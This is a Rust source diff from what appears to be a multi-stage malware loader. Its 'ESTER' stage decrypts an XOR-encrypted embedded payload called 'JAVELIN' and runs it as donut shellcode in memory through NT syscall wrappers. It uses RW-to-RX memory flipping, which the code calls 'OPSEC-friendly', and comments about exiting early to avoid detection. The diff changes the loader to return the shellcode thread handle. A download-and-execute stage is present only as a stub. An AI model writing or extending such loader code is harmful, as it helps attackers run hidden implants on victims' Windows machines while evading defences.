@@ -9,6 +9,7 @@
 
 use crate::config::{ENCRYPTED_JAVELIN, JAVELIN_XOR_KEY, JAVELIN_DOWNLOAD_URL};
 use std::error::Error;
+use winapi::um::winnt::HANDLE;
 
 /// Triggers Stage 2 (JAVELIN) execution
 ///
@@ -25,9 +26,9 @@ use std::error::Error;
 ///
 /// # Returns
 ///
-/// * `Ok(())` - JAVELIN triggered successfully
+/// * `Ok(HANDLE)` - Thread handle for JAVELIN (caller should wait on it)
 /// * `Err(_)` - Failed to trigger JAVELIN
-pub fn trigger_javelin() -> Result<(), Box<dyn Error>> {
+pub fn trigger_javelin() -> Result<HANDLE, Box<dyn Error>> {
     crate::debug_print!("[STAGE_TRIGGER] Starting JAVELIN trigger sequence");
 
     // Check if we have an embedded payload
@@ -47,9 +48,7 @@ pub fn trigger_javelin() -> Result<(), Box<dyn Error>> {
 
     // Execute JAVELIN in memory
     crate::debug_print!("[STAGE_TRIGGER] Executing JAVELIN in memory");
-    execute_in_memory(&decrypted)?;
-
-    Ok(())
+    execute_in_memory(&decrypted)
 }
 
 /// XOR decryption (symmetric cipher)
@@ -74,7 +73,7 @@ fn xor_decrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
 ///
 /// This RW → RX transition is more OPSEC-friendly than direct RWX allocation
 #[cfg(target_os = "windows")]
-fn execute_in_memory(payload: &[u8]) -> Result<(), Box<dyn Error>> {
+fn execute_in_memory(payload: &[u8]) -> Result<HANDLE, Box<dyn Error>> {
     use std::ffi::c_void;
     use dinvk::winapis::{NtAllocateVirtualMemory, NtProtectVirtualMemory, NtCurrentProcess};
 
@@ -127,9 +126,7 @@ fn execute_in_memory(payload: &[u8]) -> Result<(), Box<dyn Error>> {
         
         // Create a thread to execute the shellcode
         // This is the correct way to execute donut shellcode
-        // NOTE: We do NOT wait for the thread to complete because JAVELIN will
-        // spawn the agent which is a long-running process. ESTER should exit
-        // after spawning JAVELIN to avoid detection.
+        // We return the handle so the caller can wait on it
         #[cfg(target_os = "windows")]
         {
             use winapi::um::processthreadsapi::CreateThread;
@@ -147,24 +144,21 @@ fn execute_in_memory(payload: &[u8]) -> Result<(), Box<dyn Error>> {
                 return Err("Failed to create thread for shellcode execution".into());
             }
             
-            // Do NOT wait for thread - let JAVELIN run asynchronously
-            // The thread will continue running even after ESTER exits
-            crate::debug_print!("[STAGE_TRIGGER] JAVELIN thread spawned successfully (running asynchronously)");
+            crate::debug_print!("[STAGE_TRIGGER] JAVELIN thread spawned successfully");
+            
+            // Return the handle so caller can wait on it
+            return Ok(thread_handle);
         }
         
         #[cfg(not(target_os = "windows"))]
         {
             return Err("Shellcode execution only supported on Windows".into());
         }
-        
-        crate::debug_print!("[STAGE_TRIGGER] JAVELIN shellcode execution completed");
     }
-
-    Ok(())
 }
 
 #[cfg(not(target_os = "windows"))]
-fn execute_in_memory(_payload: &[u8]) -> Result<(), Box<dyn Error>> {
+fn execute_in_memory(_payload: &[u8]) -> Result<HANDLE, Box<dyn Error>> {
     Err("Memory execution not implemented for non-Windows platforms".into())
 }
 
@@ -176,7 +170,7 @@ fn execute_in_memory(_payload: &[u8]) -> Result<(), Box<dyn Error>> {
 /// - Requires network connectivity
 ///
 /// **Not implemented yet** - Placeholder for future enhancement
-fn download_and_execute_javelin() -> Result<(), Box<dyn Error>> {
+fn download_and_execute_javelin() -> Result<HANDLE, Box<dyn Error>> {
     // TODO: Implement HTTPS download of Stage 2
     // This would use the same TLS configuration as the agent
     // For now, return an error
